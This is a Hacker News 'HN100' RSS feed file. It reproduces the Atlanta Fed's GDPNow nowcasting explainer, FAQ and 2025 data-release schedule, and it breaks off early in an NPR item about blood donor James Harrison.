<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Mon, 03 Mar 2025 21:30:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Atlanta Fed predicts -2.8% GDP (144 pts)]]></title>
            <link>https://www.atlantafed.org/cqer/research/gdpnow</link>
            <guid>43246371</guid>
            <pubDate>Mon, 03 Mar 2025 20:35:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.atlantafed.org/cqer/research/gdpnow">https://www.atlantafed.org/cqer/research/gdpnow</a>, See on <a href="https://news.ycombinator.com/item?id=43246371">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="myTabContent">

<div id="Tab1" role="tabpanel" aria-labelledby="Element1">
                        <p>The growth rate of real gross domestic product (GDP) measured by the U.S. Bureau of Economic Analysis (BEA) is a key metric of the pace of economic activity. It is one of the four variables included in the economic projections of Federal Reserve Board members and Bank presidents for every other Federal Open Market Committee (FOMC) meeting. As with many economic statistics, GDP estimates are released with a lag whose timing can be important for policymakers. For example, of the four scheduled 2014 release dates of an “advance” (or first) estimate of GDP growth, two are on the second day of a scheduled FOMC meeting with the other two on the day after the meeting. In preparation for FOMC meetings, policymakers have the Fed Board staff projection of this “advance” estimate at their disposal. These projections—available through 2008 at the <a href="http://www.philadelphiafed.org/research-and-data/real-time-center/greenbook-data/">Philadelphia Fed’s Real Time Data Center</a>—have generally been more accurate than forecasts from simple statistical models. As stated by economists <a href="http://amstat.tandfonline.com/doi/abs/10.1198/jbes.2009.07214#.U20Z4FeUWSY">Jon Faust and Jonathan H. Wright in a 2009 paper</a>, “by mirroring key elements of the data construction machinery of the Bureau of Economic Analysis, the Fed staff forms a relatively precise estimate of what BEA will announce for the previous quarter’s GDP even before it is announced.”</p>
<p>The Atlanta Fed GDPNow model also mimics the methods used by the BEA to estimate real GDP growth. The GDPNow forecast is constructed by aggregating statistical model forecasts of 13 subcomponents that comprise GDP. Other private forecasters use similar approaches to “<a href="http://en.wikipedia.org/wiki/Nowcasting_%28economics%29">nowcast</a>” GDP growth. However, these forecasts are not updated more than once a month or quarter, are not publicly available, or do not have forecasts of the subcomponents of GDP that add “color” to the top-line number. The Atlanta Fed GDPNow model fills these three voids.</p>
<p>The BEA’s advance estimates of the subcomponents of GDP use publicly released data from the U.S. Census Bureau, U.S. Bureau of Labor Statistics, and other sources. Much of this data is displayed in the BEA’s <a href="https://www.bea.gov/data/gdp/gross-domestic-product" target="_blank">Key Source Data and Assumptions</a> table that accompanies the “advance” GDP estimate. GDPNow relates these source data to their corresponding GDP subcomponents using a “bridge equation” approach similar to the one described in a <a href="http://www.minneapolisfed.org/research/qr/qr2022.pdf">Minneapolis Fed</a> study by Preston J. Miller and Daniel M. Chin. Whenever the monthly source data is not available, the missing values are forecasted using econometric techniques similar to those described in papers by <a href="http://www.tandfonline.com/doi/abs/10.1198/073500102317351921#.U20n6leUWSY">James H. Stock and Mark W. Watson</a> and <a href="http://ideas.repec.org/a/eee/moneco/v55y2008i4p665-676.html">Domenico Giannone, Lucrezia Reichlin, and David Small</a>. A detailed description of the data sources and methods used in the GDPNow model is provided in an accompanying <a href="https://www.atlantafed.org/pubs/wp/14_07.cfm">Atlanta Fed working paper</a>.</p>
<p>As more monthly source data becomes available, the GDPNow forecast for a particular quarter evolves and generally becomes more accurate. That said, the forecasting error can still be substantial just prior to the “advance” GDP estimate release. It is important to emphasize that the Atlanta Fed GDPNow forecast is a model projection not subject to judgmental adjustments. It is not an official forecast of the Federal Reserve Bank of Atlanta, its president, the Federal Reserve System, or the FOMC.</p>
<p>©2017 Federal Reserve Bank of Atlanta. All rights reserved. Permission is granted to reproduce for personal and educational use only.</p>
                        
                    </div>
<div id="Tab2" role="tabpanel" aria-labelledby="Element2">
                        
<p><strong>Is GDPNow an official forecast of the Atlanta Fed or the Bank's president?</strong><br>
No, it is not an official forecast of the Atlanta Fed, its president, the Federal Reserve System, or the FOMC.</p>
<p><strong>Is any judgment used to adjust the forecasts?</strong><br>
No. Once the GDPNow model begins forecasting GDP growth for a particular quarter, the code will not be adjusted until after the "advance" estimate. If we improve the model over time, we will roll out changes right after the "advance" estimate so that forecasts for the subsequent quarter use a fixed methodology for their entire evolution. </p>
<p><strong>When will nowcasts of GDP growth in a particular quarter begin and end?</strong><br>
GDPNow nowcasts of real GDP growth in a particular quarter begin about 90 days before the "advance" estimate for GDP growth for the quarter is released; they end on the last business day with a data release GDPNow utilizes that precedes the release date of the Bureau of Economic Analysis’s (BEA) advance estimate of GDP growth. Except after annual benchmark or comprehensive revisions of GDP typically occurring in late July, GDPNow nowcasts for a quarter generally begin on the weekday after the advance estimate of GDP growth for the previous quarter is released. After comprehensive or benchmark GDP revisions, the initial GDPNow nowcast for the subsequent quarter can be delayed for around a week until the BEA releases revised “underlying detail tables” for the National Income and Product Accounts.</p>
<p>For example, GDPNow’s initial nowcast of real GDP growth in the first quarter of 2018 took place on Monday, January 29, 2018, the first weekday after Friday, January 26, 2018, when the advance estimate of real GDP growth in the fourth quarter of 2017 was released. The final GDPNow nowcast of real GDP growth in the first quarter of 2018 was made on April 26, 2018, and the advance estimate of real GDP growth in the first quarter of 2018 was released on April 27, 2018.
</p>
<p><strong>How frequently is the GDPNow forecast updated?</strong><br>
The model forecast is updated six or seven times a month on weekdays, with at least one following seven data releases: <a href="http://www.ism.ws/ismreport/mfgrob.cfm">Manufacturing ISM Report on Business</a>, <a href="http://www.census.gov/foreign-trade/Press-Release/current_press_release/">U.S. International Trade in Goods and Services (FT900)</a>, <a href="http://www.census.gov/wholesale/">Wholesale Trade</a>, <a href="http://www.census.gov/retail/">Monthly Retail Trade Report</a>, <a href="http://www.census.gov/construction/nrc/">New Residential Construction</a>, <a href="http://www.census.gov/manufacturing/m3/adv/pdf/durgd.pdf">Advance Report on Durable Goods Manufacturers</a>, and <a href="http://www.bea.gov/newsreleases/national/pi/pinewsrelease.htm">Personal Income and Outlays</a>. Other data releases, such as <a href="http://www.federalreserve.gov/releases/g17/current/">Industrial Production and Capacity Utilization</a> and <a href="http://www.realtor.org/topics/existing-home-sales">Existing-Home Sales</a>, are incorporated in the model as well and their impact on the model's forecast will be shown on the next weekday with one of the data releases. The proprietary forecasts from <em>Blue Chip Economic Indicators</em> and <em>Blue Chip Financial Forecasts</em> shown in the chart are available from <a href="http://www.bluechippubs.com/">Aspen Publishers</a>.</p>
<p><strong>How can I access historical forecasts from the GDPNow model?</strong><br>
These forecasts are available in <a href="https://www.frbatlanta.org/-/media/Documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx?la=en">this</a> downloadable spreadsheet. See the tab "ReadMe" in the spreadsheet for hyperlinks to the historical forecasts and other data for the model. In particular, the tab "TrackingDeepArchives" has forecasts for the 2011:Q3–2014:Q1 period (before the model went live), the tab "TrackingArchives" has forecasts from 2014:Q2 through the last quarter for which an advance estimate of GDP has been released by the BEA, and the tab "TrackRecord" has a comparison of the historical GDPNow model forecasts with the actual "advance" real GDP growth estimates from the BEA.</p>
<p><strong>Where can I read about the methods and source data used in the model?</strong><br>
A detailed description is given in a <a href="https://www.atlantafed.org/-/media/documents/research/publications/wp/2014/wp1407.pdf">working paper</a>&nbsp;describing the model. To summarize, the BEA's <a href="http://www.bea.gov/national/pdf/allchapters.pdf">NIPA Handbook</a> provides very detailed documentation on both the source data and methods used for estimating the subcomponents of GDP. The late Nobel Prize–winning economist Lawrence Klein pioneered many of the "bridge equation" methods used for making short-run forecasts of GDP growth using this source data; <a href="http://www.tradersshop.com/prod/2011106900000/CQM_Theory_Revision.pdf">a 1989 paper</a> he coauthored with E. Sojo describes the approach. Kathleen Navin, an economist at Macroeconomic Advisers, provides a bird's-eye view illustrating how to use a bridge equation approach in practice to improve GDP forecasts in <a href="https://www.dropbox.com/s/yx8kzd6dzdxvndd/Navin.pdf?dl=0">this 2017 presentation</a>. The econometric techniques used in our GDPNow model were heavily adapted from the GDP nowcasting models described in a 1996 Minneapolis Fed<em> Quarterly Review</em> article by <a href="http://www.minneapolisfed.org/research/qr/qr2022.pdf">Preston J. Miller and Daniel M. Chin</a> and a <a href="http://ideas.repec.org/a/eee/moneco/v55y2008i4p665-676.html">2008 paper</a> by the Board's David Small and economists Domenico Giannone and Lucrezia Reichlin.</p>
<p><strong>Where can I find alternative forecasts of GDP growth?</strong><br>
For model forecasts from other Reserve Banks, see the <a href="https://www.newyorkfed.org/research/policy/nowcast.html">New York Fed Nowcasting Report</a>, the <a href="https://fred.stlouisfed.org/series/STLENI">St. Louis Fed Economic News Index: Real GDP Nowcast</a>, the <a href="http://www.philadelphiafed.org/research-and-data/real-time-center/PRISM/">Philadelphia Research Intertemporal Stochastic Model (PRISM)</a>, and the Federal Reserve Bank of Cleveland's <a href="https://www.clevelandfed.org/en/our-research/indicators-and-data/yield-curve-and-gdp-growth.aspx">prediction model for GDP growth based on the slope of the yield curve</a>. <a href="https://www.economy.com/dismal/models/high-frequency-us-gdp-model.aspx">Moody's Analytics</a> and <a href="http://www.now-casting.com/">Now-Casting.com</a> produce proprietary model short-run GDP forecasts. For survey-based forecasts, see the Philadelphia Fed's <a href="http://www.philadelphiafed.org/research-and-data/real-time-center/survey-of-professional-forecasters/">quarterly Survey of Professional Forecasters,</a> which includes forecasts of real GDP and its major subcomponents. The <em>Wall Street Journal</em>'s <a href="http://online.wsj.com/public/page/economic-forecasting.html">Economic Forecasting Survey</a> occurs monthly, and the Moody's Analytics/CNBC <a href="http://www.cnbc.com/id/101508204">Rapid Update</a> survey generally occurs several times a week. Neither of these surveys includes forecasts of the subcomponents of GDP.</p>
<p><strong>How accurate are the GDPNow forecasts? Are they more accurate than "professional" forecasts?</strong><br>
The chart below shows GDPNow's real-time forecasts made just prior to the release of the initial estimate of the annualized growth rate of real GDP along with the initial estimates from the US Bureau of Economic Analysis.</p>

<p>Since we started tracking GDP growth with versions of this model in 2011, the average absolute error of final GDPNow forecasts is 0.77 percentage points. The <a href="http://en.wikipedia.org/wiki/Root-mean-square_deviation" target="blank">root-mean-squared error</a> of the forecasts is 1.15 percentage points. These accuracy measures cover initial estimates for 2011:Q3–2024:Q3. Some further analysis of GDPNow's forecast errors is available in <em>macroblog</em> posts located <a href="http://macroblog.typepad.com/macroblog/2016/05/gdpnow-and-then.html">here</a> and <a href="http://macroblog.typepad.com/macroblog/2016/05/can-two-wrongs-make-a-right.html">here</a>. We have made some improvements to the model from its earlier versions, and the model forecasts have become more accurate over time (the complete track record is <a href="https://www.frbatlanta.org/-/media/Documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx?la=en">here</a>). When back-testing with <em>revised</em> data, the root mean-squared error of the model's out-of sample forecast with the same data coverage that an analyst would have just before the "advance" estimate is 1.15 percentage points for the 2000:Q1–2013:Q4 period. The figure below shows how the forecasts become more accurate as the interval between the date the forecast is made and the forthcoming GDP release date narrows.</p>

<!--<p><img width="472" height="364" title="Root Mean Square Forecast Error of GDP Growth (SAAR) for GDPNow Model" alt="Root Mean Square Forecast Error of GDP Growth (SAAR) for GDPNow Model" src="~/media/Images/cqer/researchcq/gdpnow/gdpnowforecastchart.ashx" class="centeredImage" /></p>-->
<p>Overall, these accuracy metrics do not give compelling evidence that the model is more accurate than professional forecasters. The model does appear to fare well compared to other conventional statistical models.</p>
<p><strong>How are revisions to data not yet reflected in the latest GDP release handled?</strong><br>
In general, the model does not attempt to anticipate how data releases after the latest GDP report will affect the revisions made in the forthcoming GDP release. The exception is the "change in private inventories" subcomponent, where revisions to the prior quarter's reading affect GDP growth in the current quarter. Users of the GDPNow forecast should generally use the forecasts of the change in "net exports" and the change in the "change in private inventories," and not forecasts of the levels. Revisions to retail sales are used to anticipate revisions to real monthly expenditures in the "<a href="http://www.bea.gov/faq/index.cfm?faq_id=519">PCE control group</a>" and revisions to housing starts are used to anticipate revisions in the <a href="http://www.census.gov/construction/c30/c30index.html">monthly value of private residential construction spending put in place</a>.</p>
<p><strong>Do you share your code?</strong><br>
At this point, no. However, the Excel <a href="https://www.frbatlanta.org/-/media/Documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx?la=en">spreadsheet</a> gives the numerical details—including the raw data and model parameters—of how the monthly data map into forecasts of the subcomponents of GDP.</p>
<p><strong>What are the differences between GDPNow and the FRBNY Nowcast models? Why do the two models have different forecasts?</strong></p>
<p>The FRBNY Nowcast model of real GDP growth is based on a dynamic factor model described in this <a href="http://libertystreeteconomics.newyorkfed.org/2016/04/just-released-introducing-the-frbny-nowcast.html#.Vw0Qz3qgYks">Liberty Street blog entry.</a> The <a href="https://www.chicagofed.org/publications/cfnai/index">Chicago Fed National Activity Index</a> and <a href="https://www.philadelphiafed.org/research-and-data/real-time-center/business-conditions-index">Aruoba-Diebold-Scotti Business Conditions Index</a> are both indicators of economic activity estimated from factor models. The latest nowcast from the FRBNY Nowcast model along with some related Q&amp;A is available <a href="https://www.newyorkfed.org/research/policy/nowcast.html">here</a>.</p>
<p>The Atlanta Fed's GDPNow also uses a dynamic factor model—based on a <a href="http://www.sciencedirect.com/science/article/pii/S0304393208000652">model</a> from one of the New York Fed economists who coauthored the Liberty Street blog entry—but uses the factor only as an input to fill in the yet-to-be-released monthly source data for GDP. The estimates of this dynamic factor are available in the <strong>Factor </strong>tab of this <a href="https://www.atlantafed.org/-/media/documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx">Excel file</a>.</p>
<p>The monthly source data are then used to estimate the subcomponents of GDP, which are then aggregated up to a real GDP growth nowcast. Besides a dynamic factor model, GDPNow uses several other econometric techniques, including "bridge equations" and Bayesian vector autoregressions, to nowcast the subcomponents of GDP. The exact methods are described in this <a href="https://www.atlantafed.org/sitecore/service/notfound.aspx?item=web%3a%7b8D93F92E-8FC1-46D3-A7F2-A00EF85E4B28%7d%40en">working paper</a>. The numerical details—including the raw data and model parameters—translating the monthly data into nowcasts of the subcomponents of GDP in the latest GDPNow forecast are available in this <a href="https://www.atlantafed.org/-/media/documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx">Excel file</a> (see the <strong>ReadMe</strong> tab).</p>
<p>Because GDPNow and the FRBNY Nowcast are different models, they can generate different forecasts of real GDP growth. Our policy is not to comment on or interpret any differences between the forecasts of these two models.</p>
                        
                    </div>
<div id="Tab3" role="tabpanel" aria-labelledby="Element3">
                        <p>These charts show how the forecasted GDP subcomponent contributions to growth aggregate up to GDPNow's real GDP growth forecast for each update day in a particular forecast quarter and how changes in the subcomponent contribution forecasts aggregate up to changes in the GDP growth forecasts. Whenever a user hovers the cursor over a bar in one of the charts, the pop-up box displays the data releases for the date of the bar as well the numerical values for the GDP growth forecast and either the levels or changes in the subcomponent contribution forecasts. For previously reported quarters, the final date in the top chart shows the official first estimates of real GDP growth and the subcomponent contributions to growth from the Bureau of Economic Analysis (BEA). The final date in the bottom chart shows the forecast errors of the final GDPNow projections of the BEA's first estimates of real GDP growth and the subcomponent contributions to growth.</p>

<p><label for="chooseQuarter">Select a quarter:</label></p>



                        
                    </div>
<div id="Tab4" role="tabpanel" aria-labelledby="Element4">
                        
<p>Release times shown are from the original source. The GDPNow model is usually updated within a few hours following these times. Release schedule subject to change.</p>
<table>
    <tbody>
        <tr>
            <td><strong>Release</strong></td>
            <td><strong>Date of release</strong></td>
            <td><strong>Time of release</strong></td>
        </tr>
        <tr>
            <td>Construction spending</td>
            <td>1/2/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index</td>
            <td>1/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>1/7/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>1/9/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Import and export prices</td>
            <td>1/16/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts, Industrial production and capacity utilization</td>
            <td>1/17/2025</td>
            <td>9:15 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>1/28/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Final nowcast of 2024:Q4 GDP growth: Advance Economic Indicators</td>
            <td>1/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Initial nowcast of 2025:Q1 GDP growth: Personal income and outlays, NIPA underlying detail tables</td>
            <td>1/31/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>2/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>2/5/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Employment situation, Wholesale trade</td>
            <td>2/7/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Import and export prices</td>
            <td>2/14/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>2/19/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, Advance Economic Indicators</td>
            <td>2/28/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>3/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), Wholesale trade</td>
            <td>3/6/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories</td>
            <td>3/17/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts, Industrial production and capacity utilization, Import and export prices</td>
            <td>3/18/2025</td>
            <td>9:15 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>3/26/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables</td>
            <td>3/28/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>4/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>4/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization</td>
            <td>4/16/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>4/17/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1), Existing-home sales</td>
            <td>4/24/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Final nowcast of 2025:Q1 GDP growth:  Advance Economic Indicators</td>
            <td>4/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Initial nowcast of 2025:Q2 GDP growth:  Personal income and outlays, Q1 GDP, NIPA underlying detail tables</td>
            <td>4/30/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>5/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report)</td>
            <td>5/6/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>5/8/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Producer Price Index</td>
            <td>5/15/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts, Import and export prices</td>
            <td>5/16/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>5/27/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, Advance Economic Indicators</td>
            <td>5/30/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>6/2/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report)</td>
            <td>6/5/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>6/9/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Import and export prices</td>
            <td>6/17/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>6/18/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables</td>
            <td>6/27/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>7/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), Employment situation, Census M3-2 manufacturing (Full report), ISM Services</td>
            <td>7/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>7/9/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Import and export prices</td>
            <td>7/17/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>7/18/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>7/25/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Final nowcast of 2025:Q2 GDP growth:  Advance Economic Indicators</td>
            <td>7/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Initial nowcast of 2025:Q3 GDP growth:  Personal income and outlays, NIPA underlying detail tables</td>
            <td>7/31/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending, Employment situation</td>
            <td>8/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>8/5/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>8/7/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Import and export prices</td>
            <td>8/15/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>8/19/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>8/26/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, Advance Economic Indicators</td>
            <td>8/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>9/2/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>9/4/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade, Producer Price Index</td>
            <td>9/10/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Import and export prices</td>
            <td>9/16/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>9/17/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables**</td>
            <td>9/26/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>10/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report)</td>
            <td>10/7/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>10/9/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>10/27/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Final nowcast of 2025:Q3 GDP growth:  Advance Economic Indicators</td>
            <td>10/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Initial nowcast of 2025:Q4 GDP growth:  Personal income and outlays, NIPA underlying detail tables</td>
            <td>10/31/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), Census M3-2 manufacturing (Full report)</td>
            <td>11/4/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>11/6/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Producer Price Index</td>
            <td>11/14/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>11/19/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, Advance Census manufacturing (M3-1), GDP, Advance Economic Indicators, New-home sales</td>
            <td>11/26/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>12/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report)</td>
            <td>12/4/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade, Consumer Price Index</td>
            <td>12/10/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts, Import and export prices</td>
            <td>12/16/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories</td>
            <td>12/17/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, GDP, Existing-home sales</td>
            <td>12/19/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>12/24/2025</td>
            <td>8:30 AM</td>
        </tr>
    </tbody>
</table>
<p><a href="https://www.atlantafed.org/-/media/documents/cqer/researchcq/gdpnow/GDPNowcastDataReleaseDates.xlsx">Download a spreadsheet of these release dates</a></p>
<p>*Time of last economic release; GDPNow update typically released 2 to 3.5 hours after this time.</p>
<p>**Timing of 9/26 GDPNow updates depends on details regarding 2025 annual revision of the National Income and Product Accounts.  Further details to be determined/announced.</p>
                        
                    </div>
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[James Harrison, whose blood donations saved >2M babies, has died (103 pts)]]></title>
            <link>https://www.npr.org/2025/03/03/nx-s1-5316163/james-harrison-blood-donor</link>
            <guid>43245129</guid>
            <pubDate>Mon, 03 Mar 2025 18:36:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.npr.org/2025/03/03/nx-s1-5316163/james-harrison-blood-donor">https://www.npr.org/2025/03/03/nx-s1-5316163/james-harrison-blood-donor</a>, See on <a href="https://news.ycombinator.com/item?id=43245129">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="storytext">
      <div id="resg-s1-51764">
            <div data-crop-type="">
        <picture>
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/400/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/900/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1200/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1600w,
